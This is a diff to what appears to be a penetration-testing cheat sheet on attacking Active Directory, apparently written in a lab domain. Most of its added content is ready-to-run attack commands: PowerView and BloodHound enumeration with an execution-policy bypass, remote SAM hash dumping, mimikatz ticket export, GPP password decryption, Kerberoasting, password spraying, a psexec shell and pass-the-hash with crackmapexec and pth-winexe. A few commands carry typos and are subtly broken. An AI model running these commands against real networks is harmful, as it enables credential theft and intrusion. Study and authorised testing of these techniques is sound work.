@@ -73,17 +73,75 @@ net group /domain
 PS : [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ``` 
 - Enumerate logged-in users ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))
+> [Power View Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 ```
 PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
 
 PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName [COMPUTER_NAME]
+
+# Domain info
+Get-NetDomain
+
+# Domain Controllers
+Get-NetDomainController
+
+# Domain policy
+Get-DomainPolicy
+
+# Info about access control
+(Get-DomainPolicy)."system access"
+
+# Network users
+Get-NetUser
+
+# Last time passwd were updated
+Get-UserProperty -Properties pwdlastset
+
+# Bad passwds
+Get-UserProperty -Propertiesbadpwdcount
+
+# Computer List
+Get-NetComputer
+
+# Computer List with FullData
+Get-NetComputer -FullData
+
+# Obtain groups
+Get-NetGroup
+
+# Obtain shares
+Invoke-ShareFinder
+
+# Obtain Group Policies
+Get-NetGPO
 ```
+
 - Enumerate active sessions on the DC
 ```bat
 PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
 ```
 
+## Bloodhound
+- Start neo4j database
+  ```bash
+  neo4j
+  ```
+- Start bloodhound
+  ```bash
+  bloodhound
+  ```
+- Obtain data ([SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
+  ```bash
+  powershell -ep bypass SharpHound.ps1
+  
+  Invoke-BloodHound -CollectionMethod All -Domain [Dominio] -ZipFileName file.zip
+  ```
+
 # Obtain passwords/tickets
+- Dump SAM hashes remotly with [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
+  ```
+  secretsdump.py marvel/fcastle:Password1@192.168.57.141
+  ```
 - Hashes in LSASS memory space
   ```bat
   C:\Tools\active_directory> mimikatz.exe
@@ -98,7 +156,7 @@ PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
   ```bat
   mimikatz # sekurlsa::tickets
   ```
-- Export tickets
+- Export tickets (obtain .kirbi file)
   ```bat
   mimikatz # kerberos::list /export
   ```
@@ -111,18 +169,40 @@ PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
   ```bat
   .\Spray-Passwords.ps1 -Pass Test123 -Admin
   ```
+# GPP / cPassword Attack
+- If we find a **Group Policy Preferences XML** file we can get the **cPassword**.
+  ```bash
+  python3 gpp-decrypt.py -f [groups.xml]
+  ```
   
 # Kerberoasting
-It is a technique used to decrypt a Kerberos Ticket
-```bash
-sudo apt update && sudo apt install kerberoast
+1.
+  It is a technique used to decrypt a Kerberos Ticket
+  ```bash
+  sudo apt update && sudo apt install kerberoast
 
-python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt exported-kerberos-list-mimikatz.kirbi
-``` 
+  python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt exported-kerberos-list-mimikatz.kirbi
+  ``` 
+2.
+  ```bash
+  python GetUserSPNs.py <DOMAIN/username:password> dc-ip <ip of DC> -request
+  ```
+  
 - Tools like Hashcat or John The Reapper can be also used
 - **Invoke-Kerberoast.ps1** can automatically enumerate all service prinvipal names in the domain, request service tickets for them, and export them in a format ready for cracking with JTR and Hashcat.
 
 # Lateral Movement
+## Pass the Password
+- Discovering machines with the specified user/pass
+  ```bash
+  crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
+  
+  crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
+  ```
+- Get a shell
+  ```bash
+  psexec.py marvel/fcastle:Password1@192.168.57.142
+  ```
 ## Pass The Hash
 - It uses an NTLM Hash
 - This will not work for Kerberos authentication, only for server or service using NTLM authentication.
@@ -134,6 +214,10 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt exported-kerberos-list-
 - Using *pth-winexe* from Pass-The-Hash-Toolkit
   ```bash
   pth-winexe -U xonork%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.11 cmd
+  ```
+- Using _crackmapexec_
+  ```
+  crackmapexec <ip/CIDR> -u<user> -H <hash> --local
   ```
 ## Overpass the Hash
 - We can "over" abuse a NTLM user hash to gain a full TGT or sevice ticket
